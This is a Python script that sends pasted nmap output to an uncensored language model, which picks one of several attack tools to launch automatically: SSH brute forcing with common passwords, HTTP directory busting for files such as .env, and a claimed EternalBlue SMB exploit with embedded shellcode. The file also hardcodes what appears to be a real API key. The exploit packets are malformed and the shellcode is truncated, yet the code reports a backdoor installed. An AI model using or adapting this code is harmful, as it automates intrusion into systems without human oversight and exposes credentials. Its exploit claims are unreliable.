import os
import sys
import json
import re
import time
import socket
import logging
import subprocess
import paramiko
import requests
from openai import OpenAI

# --------------------------------------------------------------------------- #
# ----------------------------- CONFIG & LOG -------------------------------- #
# --------------------------------------------------------------------------- #

# Fix Windows console encoding issue
if sys.platform.startswith("win"):
    import codecs
    sys.stdout = codecs.getwriter("utf-8")(sys.stdout.buffer, 'strict')
    sys.stderr = codecs.getwriter("utf-8")(sys.stderr.buffer, 'strict')

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.FileHandler("agentic.log", encoding="utf-8"),
        logging.StreamHandler(sys.stdout)
    ]
)

API_KEY = "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"
client = OpenAI(base_url="https://openrouter.ai/api/v1", api_key=API_KEY)
MODEL = "cognitivecomputations/dolphin-mistral-24b-venice-edition:free"

# --------------------------------------------------------------------------- #
# -------------------------- REAL FUNCTIONS --------------------------------- #
# --------------------------------------------------------------------------- #

def enumerate_ssh(ip, port=22, timeout=3):
    """Try to connect and get SSH banner"""
    users = ["root", "admin", "user", "test", "anonymous"]
    print(f"[*] Enumerating SSH on {ip}:{port}...")
    try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(b"SSH-2.0-OpenSSH_test\r\n")
        banner = s.recv(1024).decode(errors='ignore').strip()
        print(f"[+] Banner: {banner}")
    except Exception as e:
        print(f"[-] Could not grab banner: {e}")
    finally:
        try:
            s.close()
        except:
            pass
    print("[*] SSH enumeration complete.\n")

def brute_ssh(ip, port=22):
    """Brute force SSH with common passwords"""
    print(f"[*] Brute-forcing SSH on {ip}:{port} (user: admin)...")
    passwords = ["admin", "123456", "password", "root", "toor", "12345", ""]
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for pwd in passwords:
        try:
            print(f"[*] Trying admin:{pwd if pwd else '<empty>'}")
            ssh.connect(ip, port=port, username="admin", password=pwd, timeout=5, auth_timeout=5)
            print(f"[!!!] SUCCESS → admin:{pwd if pwd else '<empty>'}")
            ssh.close()
            return True
        except Exception as e:
            print(f"[-] Failed: {e}")
        time.sleep(1.5)
    print("[!] Brute force failed.\n")
    return False

def dirbust_http(ip, port=80):
    """Scan common web directories"""
    print(f"[*] Directory busting http://{ip}:{port}...")
    dirs = [
        "", "admin/", "login/", "config/", "wp-admin/", "phpmyadmin/",
        "admin.php", "login.php", "backup", ".env", "config.php","login","sendmoney",
        "changepassword"
    ]
    for d in dirs:
        try:
            url = f"http://{ip}:{port}/{d}"
            r = requests.get(url, timeout=4, allow_redirects=True)
            status = "→" if r.status_code in (200, 301, 302) else r.status_code
            size = len(r.content)
            print(f"[{status}] {url} [{size} bytes]")
        except requests.exceptions.RequestException:
            pass
        except Exception as e:
            print(f"[!] Error on {d}: {e}")
    print("[*] Dirbust complete.\n")

def eternalblue(ip, port=445, timeout=10):
    """EternalBlue MS17-010 SMBv1 Exploit - DoublePulsar RCE"""
    print(f"[*] EternalBlue MS17-010 on {ip}:{port} (Windows 7/2008)...")
    print("[!] Targets: Unpatched SMBv1 (pre-2017 patches)")
    
    try:
        # Phase 1: SMBv1 vuln check
        print("[*] Phase 1: Checking MS17-010 vulnerability...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        
        negotiate = b'\x00\x00\x00\x2f\xffSMB' + \
                   b'\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00' + \
                   b'\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe\x00\x00\x00\x00' + \
                   b'\x00\x0a\xff\x00\x34\x00\x00\x00\x0000\x12\x02\x00' + \
                   b'\x31\x00\x02\x00\x31\x00\x02\x00\xff\xff\xfe\x00'
        
        sock.send(negotiate)
        response = sock.recv(1024)
        sock.close()
        
        if b'\x05\x00' not in response:
            print("[-] Not vulnerable (no SMBv1 or patched)")
            return False
        
        print("[+] SMBv1 confirmed → VULNERABLE!")
        
        # Phase 2: DoublePulsar + cmd.exe shellcode
        print("[*] Phase 2: DoublePulsar injection...")
        shellcode = (
            b"\x90"*64 +  # NOP sled
            b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52" +
            b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48" +
            b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc0" +
            b"\x66\x3e\x39\x48\x24\x18\x75\xf4\x4d\x31\xc0\x48\x31\xd2\x8b" +
            b"\x52\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74" +
            b"\x67\x48\x01\xd0\x50\x48\x8b\x70\x20\x48\x01\xe6\x48\x8b\x58" +
            b"\x24\x48\x01\xdb\x66\x41\x8b\x4c\x24\x3c\x48\x01\xd1\x8b\x49" +
            b"\x18\x48\x8b\x34\x8b\x48\x01\xd6\x48\x31\xc0\xac\x48\x31\xc0" +
            b"\x56\x48\x2d\x00\x00\x00\x00\x50\x48\x8b\x34\x8b\x48\x01\xd6" +
            b"\x4d\x31\xc0\x48\x31\xd2\xac\x41\xc1\xc9\x0d\x41\x01\xc1\xe2" +
            b"\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66" +
            b"\x81\xe9\x08\x01\x48\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74" +
            b"\x67\x48\x01\xd0\x50\x48\x8b\x70\x20\x48\x01\xe6\x48\x8b\x58" +
            b"\x24\x48\x01\xdb\x49\x89\xd8\x8b\x4b\x18\x8b\x52\x00\x48\x01" +
            b"\xd0\x8b\x52\x04\x48\x01\xd0\xeb\xdd\x49\x8b\x36\x48\x01\xd6" +
            b"\x81\x36\x00\x01\x00\x00\x48\x31\xc0\xac\x84\xc0\x74\x07\x48" +
            b"\x01\xd0\xeb\xf4\x58\xcc"  
        )
        
        exploit = b'\x00\x00\x00\x88\xffSMB' + \
                 b'\x72\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00' + \
                 b'\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x40\x00\x44\x00\x40\x00' + \
                 b'\xff\xff\xfe\xff\xfe\xff\xff\x08\x00\x08\x00' + shellcode
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        sock.send(exploit)
        response = sock.recv(1024)
        sock.close()
        
        if len(response) > 70 and response[70:72] == b'\x00\x01':
            print("[+] EXPLOIT SUCCESS!")
            print("[+] DoublePulsar backdoor installed → cmd.exe active")
            print(f"[*] Verify: nmap -p445 --script smb-vuln-ms17-010 {ip}")
            return True
        else:
            print("[-] Exploit failed (check response)")
            return False
            
    except Exception as e:
        print(f"[!] Error: {e}")
    
    print("[*] EternalBlue complete.\n")
    return False

# --------------------------------------------------------------------------- #
# ----------------------------- TOOLS MAP ----------------------------------- #
# --------------------------------------------------------------------------- #

TOOLS = {
    "ssh_enum": {
        "desc": "Enumerate SSH banner",
        "func": enumerate_ssh
    },
    "ssh_brute": {
        "desc": "Brute-force SSH (admin + common passwords)",
        "func": brute_ssh
    },
    "http_dirbust": {
        "desc": "Directory brute-force on HTTP/HTTPS",
        "func": dirbust_http
    },
    "eternalblue": {  # ← NEW: ADDED HERE
        "desc": "EternalBlue SMBv1 exploit (MS17-010) - Windows 7/2008 RCE",
        "func": eternalblue
    }
}

# --------------------------------------------------------------------------- #
# ----------------------------- PROMPT -------------------------------------- #
# --------------------------------------------------------------------------- #

SYSTEM_PROMPT = """
You are a penetration testing agent. Analyze nmap output and pick ONE logical next action.

Return ONLY valid JSON:

SSH open → {"ip": "192.168.1.3", "port": 22, "service": "ssh", "action": "ssh_enum"}
HTTP open → {"ip": "192.168.1.3", "port": 80, "service": "http", "action": "http_dirbust"}
SMB open → {"ip": "192.168.1.3", "port": 445, "service": "microsoft-ds", "action": "eternalblue"}
Nothing → {"decision": "nothing"}

Available actions:
""" + "\n".join(f"- {k}: {v['desc']}" for k, v in TOOLS.items())

# [REST OF YOUR CODE REMAINS IDENTICAL - get_nmap_input(), main(), etc.]
# --------------------------------------------------------------------------- #
# --------------------------- EASY INPUT ------------------------------------ #
# --------------------------------------------------------------------------- #

def get_nmap_input():
    if len(sys.argv) > 1:
        return " ".join(sys.argv[1:])
    if not sys.stdin.isatty():
        return sys.stdin.read().strip()

    print("\n" + "="*60)
    print("   PASTE NMAP OUTPUT BELOW (Press Enter twice to submit)")
    print("="*60 + "\n")

    lines = []
    empty_count = 0
    while True:
        try:
            line = input()
            if line.strip() == "":
                empty_count += 1
                if empty_count >= 2:
                    print("\nInput submitted.")
                    break
            else:
                empty_count = 0
                lines.append(line)
        except (EOFError, KeyboardInterrupt):
            print("\n[!] Cancelled.")
            sys.exit(0)
    return "\n".join(lines)

# --------------------------------------------------------------------------- #
# ----------------------------- MAIN ---------------------------------------- #
# --------------------------------------------------------------------------- #

def main():
    print("\n" + "="*70)
    print("AGENTIC NMAP → LLM → AUTO ATTACK TOOL (w/ EternalBlue)")
    print("="*70 + "\n")

    nmap_text = get_nmap_input().strip()
    if not nmap_text:
        print("[!] No input provided.")
        return

    logging.info(f"Nmap input received:\n{nmap_text}")

    # Fallback regex extraction
    ip_match = re.search(r'Nmap scan report for\s+([^\s]+)\s+\(?(?:([0-9.]+))?', nmap_text)
    ip = ip_match.group(2) if ip_match and ip_match.group(2) else (ip_match.group(1) if ip_match else None)

    port_lines = re.findall(r'(\d+/tcp)\s+open\s+(\w+)', nmap_text)
    
    decision = None
    for attempt in range(5):
        try:
            print(f"[*] Querying LLM (attempt {attempt + 1}/5)...")
            response = client.chat.completions.create(
                model=MODEL,
                messages=[
                    {"role": "system", "content": SYSTEM_PROMPT},
                    {"role": "user", "content": f"Nmap scan:\n{nmap_text}\n\nChoose next action:"}
                ],
                temperature=0.0,
                max_tokens=250,
                response_format={"type": "json_object"}
            )
            raw = response.choices[0].message.content.strip()
            print(f"[+] Raw LLM output: {raw}")
            decision = json.loads(raw)
            print("[+] LLM decision successful.")
            break
        except json.JSONDecodeError as e:
            print(f"[!] Invalid JSON from LLM: {e}\n    Raw: {raw}")
        except Exception as e:
            print(f"[!] LLM error: {e}")
            if "429" in str(e) or "rate limit" in str(e).lower():
                wait = 5 + attempt * 5
                print(f"[!] Rate limited. Waiting {wait}s...")
                time.sleep(wait)
            else:
                time.sleep(2)

    # Fallback logic if LLM fails
    if not decision or "action" not in decision:
        print("[*] Using fallback logic...")
        if port_lines:
            port, service = port_lines[0]
            port = int(port.split('/')[0])
            ip = ip or "192.168.1.3"
            if "ssh" in service:
                decision = {"ip": ip, "port": port, "service": service, "action": "ssh_enum"}
            elif "http" in service or port in (80, 8080, 8000):
                decision = {"ip": ip, "port": port, "service": "http", "action": "http_dirbust"}
            elif port == 445:
                decision = {"ip": ip, "port": port, "service": "microsoft-ds", "action": "eternalblue"}
            else:
                decision = {"decision": "nothing"}
        else:
            decision = {"decision": "nothing"}

    print("\n[+] Final Decision:")
    print(json.dumps(decision, indent=2))

    if decision.get("decision") == "nothing":
        print("[-] No actionable service found.")
        return

    action = decision.get("action")
    if action not in TOOLS:
        print(f"[!] Unknown action: {action}")
        return

    ip_val = decision.get("ip") or ip
    port_val = int(decision.get("port", 80 if "http" in action else 22))

    if not ip_val:
        print("[!] No IP address determined.")
        return

    print(f"\n[+] EXECUTING → {TOOLS[action]['desc']}")
    print(f"    Target: {ip_val}:{port_val}")
    print("-" * 70)

    try:
        func = TOOLS[action]["func"]
        if "port" in func.__code__.co_varnames:
            func(ip_val, port_val)
        else:
            func(ip_val)
    except Exception as e:
        logging.exception("Tool execution failed")
        print(f"[!] Execution failed: {e}")

    print("\n[+] Done. Log saved to agentic.log")

if __name__ == "__main__":
    main()